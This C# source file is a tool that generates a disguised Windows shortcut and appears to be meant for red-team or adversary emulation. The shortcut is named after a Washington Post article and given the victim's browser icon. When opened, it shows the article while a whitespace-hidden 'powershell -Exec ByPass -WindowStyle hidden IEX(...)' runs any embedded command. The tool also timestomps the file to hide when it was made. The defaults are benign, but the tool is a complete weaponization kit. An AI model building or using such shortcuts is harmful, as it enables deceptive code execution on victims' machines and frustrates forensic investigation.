using Microsoft.Win32;
using System.Diagnostics;

public class lnk {
    internal struct CustomCommand{
        public static string command { get; set; }
    }
    public static string GenShortcutIntermediary(int selection, string command){
        //pass the specified command to GenerateShortcut
        string path = "";
        switch(selection){
            case 0:
                path = GenerateShortcut("Resolve-DnsName -Name www.google.com -Server 1.1.1.1 | Out-File -FilePath .\\DnsName.txt");
                break;
            case 1:
                path = GenerateShortcut("Get-NetIPAddress | Out-File -FilePath .\\NetIPAddress.txt");
                break;
            case 2:
                path = GenerateShortcut("whoami /groups | Out-File -FilePath .\\whoami.txt");
                break;
            case 3:
                path = GenerateShortcut("Get-Process | Out-File -FilePath .\\Process.txt");
                break;
            case 4:
                path = GenerateShortcut("calc.exe");
                break;
            case 5:
                if(command == ""){
                    outputData("No custom command detected, exiting.");
                    Environment.Exit(0);
                }
                path = GenerateShortcut(command);
                break;
        }
        return path;
    }
    public static string GenerateShortcut(string command){
        outputData("Generating a shortcut on the desktop that will run the command: "+command);

        //setup variables for the shortcut
        string description = "Meet Amos Hochstein, Biden's 'energy whisperer' on gas prices - The Washington Post"; //description for the shortcut
        string fileName = description+".lnk"; //filename of the shortcut
        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); //get the location of the user's desktop
        string path = Path.Combine(desktop, fileName); //make a path variable out of it
        //command = "Get-Process | Out-File -FilePath .\\Process.txt"; //powershell command to run from the shortcut
        string argsStart = "-WindowStyle hidden Start 'https://www.washingtonpost.com/climate-environment/2022/06/17/amos-hochstein-biden-energy-gas/'"; //first set of arguments that open web browser to article
        string argsWhiteSpace = "                                                                                                                                                                                        "; //whitespace to hide powershell commands
        string argsCommand = ";powershell.exe -Exec ByPass -NoProfile -WindowStyle hidden -c \"IEX("+command+")\""; //powershell commands to run
        string args = argsStart+argsWhiteSpace+argsCommand; //final argument string
        
        try{
            outputData("Attempting to create a shortcut object...");
            //create a shortcut object
            IWshRuntimeLibrary.WshShell wsh = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(path) as IWshRuntimeLibrary.IWshShortcut;
            
            if(shortcut != null){
                outputData("Success.");
                shortcut.TargetPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"; //set the target image to powershell
                shortcut.Arguments = args; //set the args
                shortcut.Description = description; //set the description

                string defaultBrowser = ""; //initialize default browser string

                RegistryKey localKey; //create registry key object
                if(Environment.Is64BitOperatingSystem){ //if 64 bit
                    localKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64); //open as 64 bit
                }else{ //if not
                    localKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32); //open as 32 bit
                }

                try{ //try to get the default browser ID
                    outputData("Attempting a registry query to detect the default browser...");
                    defaultBrowser = localKey.OpenSubKey("SOFTWARE").OpenSubKey("Microsoft").OpenSubKey("Windows").OpenSubKey("Shell").OpenSubKey("Associations").OpenSubKey("UrlAssociations").OpenSubKey("https").OpenSubKey("UserChoice").GetValue("ProgId").ToString();
                    outputData("Success.");
                }catch(Exception e){ //print out error if it fails
                    outputData("[!] Encountered an error obtaining the registry value for the default browser.");
                    outputData("[!] Error: " + e);
                }

                if(defaultBrowser != "" && defaultBrowser != null){
                    if(defaultBrowser.Contains("FirefoxURL")){ //set the icon to firefox if its the default browser
                        if(System.IO.File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe")){
                            shortcut.IconLocation = "C:\\Program Files\\Mozilla Firefox\\firefox.exe,0";
                            outputData("Detected FireFox as the default browser, setting shortcut icon to FireFox.");
                        }
                    }else if(defaultBrowser.Contains("ChromeHTML")){ //set the icon to chrome if its the default browser
                        if(System.IO.File.Exists(@"C:\Program Files\Google\Chrome\Application\chrome.exe")){
                            shortcut.IconLocation = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,0";
                            outputData("Detected Chrome as the default browser, setting shortcut icon to Chrome.");
                        }else if(System.IO.File.Exists(@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")){
                            shortcut.IconLocation = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe,0";
                            outputData("Detected Chrome as the default browser, setting shortcut icon to Chrome.");
                        }
                    }else if(defaultBrowser.Contains("IE.HTTP")){ //set the icon to IE if its the default browser
                        shortcut.IconLocation = "C:\\Program Files\\Internet Explorer\\iexplore.exe,0";
                        outputData("Detected Internet Explorer as the default browser, setting shortcut icon to IE.");
                    }else if(defaultBrowser.Contains("MSEdgeHTM")){ //set the icon to edge if its the default browser
                        shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,0";
                        outputData("Detected Edge as the default browser, setting shortcut icon to Edge.");
                    }else{ //revert to a blank icon if none of the above browsers are found
                        shortcut.IconLocation = "C:\\Windows\\System32\\SHELL32.dll,0";
                        outputData("Unable to detect default browser, defaulting to blank icon.");
                    }
                }else{ //use blank icon if we can't read the default browser registry key
                    shortcut.IconLocation = "C:\\Windows\\System32\\SHELL32.dll,0";
                    outputData("Unable to detect default browser, defaulting to blank icon.");
                }
                outputData("Saving the shortcut in "+path);
                shortcut.Save();

                outputData("Generating a random time to timestomp shortcut...");
                //timestomp
                DateTime currentTime = DateTime.Now; //get current time
                Random rnd = new Random(); //create random object
                int days = rnd.Next(-10,-3); //random amount of days in the past
                int hours = rnd.Next(-11,12); //random offset of hours
                int mins = rnd.Next(-53,54); //random offset of mins
                int secs = rnd.Next(-47,48); //random offset of seconds
                int msecs = rnd.Next(-38,39); //random offset of miliseconds
                TimeSpan decrease = new TimeSpan(days, hours, mins, secs, msecs); //create timespan object with above offsets
                DateTime stomp = currentTime.Add(decrease); //decrease the current time by the offset
                outputData("Random time: "+stomp.ToString());
                //set the creation time, last access time and last write time to the "stomp" time
                System.IO.File.SetCreationTime(path, stomp);
                System.IO.File.SetLastAccessTime(path, stomp);
                System.IO.File.SetLastWriteTime(path, stomp);
                outputData("Successfully timestomped shortcut.");
            }
        }catch(Exception e){
            outputData("[!] Encountered an issue creating the shortcut.");
            outputData("[!] Error: "+e);
        }
        return path;
    }

    public static int ParseArgs(string[] args){
        int selection = 0;
        if(args.Length > 0){
            if(args[0] == "-help" || args[0] == "-h"){
                PrintHelp();
                Environment.Exit(0);
            }
            else if(args[0] == "-menu" || args[0] == "-m"){
                selection = Menu();
                if (selection == 5){ //if the user wants to use a custom command, grab that
                    CustomCommand.command = ParseCommand();
                }
            }
            else if(args[0] == "-c" || args[0] == "-command"){
                string tmp = args[1];
                int num = 0;
                if(int.TryParse(tmp, out num)){
                    if(num >= 0 && num <= 5){
                        selection = num;
                        if (selection == 5){ //if the user wants to use a custom command, grab that
                            CustomCommand.command = ParseCommand();
                        }
                    }else{
                        outputData($"[!] Invalid command selection detected: {tmp}. Please try again and make a selection from 0 to 5");
                        Environment.Exit(0);
                    }
                }else{
                    outputData($"[!] Invalid command selection detected: {tmp}. Please try again and make a selection from 0 to 5");
                    Environment.Exit(0);
                }
            }
            else if(args[0] == "-C" || args[0] == "-Command"){
                CustomCommand.command = args[1];
                selection = 5;
            }
            else{
                outputData("[!] Unsupported command line argument detected. For help, please use the command line argument \"-h\" or \"-help\"");
                Environment.Exit(0);
            }
            return selection;
        }else{
            Console.WriteLine("No command line arguments detected. To access the help menu, use the command line argument \"-h\" or \"-help\"");
            Console.WriteLine("Starting the program with the default command to embed:");
            Console.WriteLine("\"Resolve-DnsName -Name www.google.com -Server 1.1.1.1 | Out-File -FilePath .\\DnsName.txt\"");
            return 0;
        }
    }

    public static void PrintHelp(){ //print the help menu for the program
        Console.WriteLine("-------------------------------------[ Generate Shortcut Help ]-------------------------------------");
        Console.WriteLine("This program will attempt to create a shortcut on the current user's desktop.");
        Console.WriteLine("The created shortcut will be embedded with a specified PowerShell command.");
        Console.WriteLine("If the shortcut creation is successful, the program will attempt to open the shortcut.");
        Console.WriteLine("DEFAULTS:");
        Console.WriteLine("If no arguments are passed, the program will create the a shortcut with the following command:");
        Console.WriteLine("Resolve-DnsName -Name www.google.com -Server 1.1.1.1 | Out-File -FilePath .\\DnsName.txt");
        Console.WriteLine("ARGUMENTS:");
        Console.WriteLine("Argument                                     |       Explanation");
        Console.WriteLine("> generate_lnk.exe [-h/-help]                |       Display this help menu.");
        Console.WriteLine("> generate_lnk.exe [-m/-menu]                |       Display the main menu.");
        Console.WriteLine("> generate_lnk.exe [-c/-command (0-5)]       |       Select one of the default commands to embed.");
        Console.WriteLine("> generate_lnk.exe [-C/-Command COMMAND]     |       Enter a custom PowerShell command to embed.");
        Console.WriteLine("All arguments are case sensitive.");
        Console.WriteLine("-c/-command must be have a number from 0 to 5 after it.");
        Console.WriteLine("-C/-Command must be followed by a string for your command. Custom commands are not validated,");
        Console.WriteLine("so the generated shortcut might not be able to run them properly. Furthermore, the program will");
        Console.WriteLine("not communicate if the entered command ran properly.");
        Console.WriteLine("----------------------------------------------------------------------------------------------------");
    }

    public static int Menu(){ //print the menu and call user input handling function.
        int retVal = 0;
        Console.WriteLine("-------------------------------------[ Generate Shortcut Menu ]-------------------------------------");
        Console.WriteLine("This program will attempt to create a shortcut on the current user's desktop.");
        Console.WriteLine("The created shortcut will be embedded with a specified PowerShell command.");
        Console.WriteLine("If the shortcut creation is successful, the program will attempt to open the shortcut.");
        Console.WriteLine("Below are the commands that can be run through the generated shortcut:");
        Console.WriteLine("0: Resolve-DnsName -Name www.google.com -Server 1.1.1.1 | Out-File -FilePath .\\DnsName.txt");
        Console.WriteLine("1: Get-NetIPAddress | Out-File -FilePath .\\NetIPAddress.txt");
        Console.WriteLine("2: whoami /groups | Out-File -FilePath .\\whoami.txt");
        Console.WriteLine("3: Get-Process | Out-File -FilePath .\\Process.txt");
        Console.WriteLine("4: calc.exe");
        Console.WriteLine("5: Supply your own PowerShell command.");
        retVal = ParseSelection();
        Console.WriteLine("----------------------------------------------------------------------------------------------------");
        return retVal;
    }

    public static int ParseSelection(){ //function to handle user input for the menu
        int retVal = 0;
        Console.Write("Please enter a number corresponding to one of the commands: ");
        string selection = Console.ReadLine();
        if (Int32.TryParse(selection, out int s)){
            if (s >= 0 && s <= 5){
                retVal = s;
            } else {
                Console.WriteLine("[!] Invalid selection detected. Please enter a number from 0 to 5.");
                retVal = ParseSelection();
            }
        } else {
            Console.WriteLine("[!] Invalid selection detected. Please enter a number from 0 to 5.");
            retVal = ParseSelection();
        }
        return retVal;
    }

    public static string ParseCommand(){ //function to handle custom commands.
        Console.WriteLine("Custom PowerShell command selected.");
        Console.WriteLine("Please note that the generated shortcut may not be able to run the command you supply.");
        Console.WriteLine("Furthermore, this program will not communicate if your entered command ran properly.");
        Console.WriteLine("Please enter your desired PowerShell command: ");
        return Console.ReadLine();
    }

    public static void outputData(string message){
        //write to both console and log file.
        Console.WriteLine(message);
        System.IO.File.AppendAllText(@".\generate_lnk_log.txt", message += "\n");
    }

    public static void startShortcut(string path){ //attempt to open the shortcut
        outputData("Attempting to open shortcut at: "+path);
        if(System.IO.File.Exists(path)){ //double check that the shortcut exists. if it does, open it
            ProcessStartInfo info = new ProcessStartInfo(Path.Combine(path));
            info.UseShellExecute = true;
            Process proc = Process.Start(info);
            outputData("Successfully opened the shortcut.");
        } else {
            outputData("[!] Unable to locate the shortcut.");
        }
    }

    public static void Main(string[] args){
        CustomCommand.command = "";
        int selection = ParseArgs(args); //handle the arguments and determine the user's selection
        string path = GenShortcutIntermediary(selection, CustomCommand.command); //pass the selection and command to generate the shortcut
        outputData("Successfully created the shortcut, opening...");
        startShortcut(path); //run the shortcut
        outputData("Completed operation, closing...");
        outputData("----------------------------------------------------------------------------------------------------");
    }
}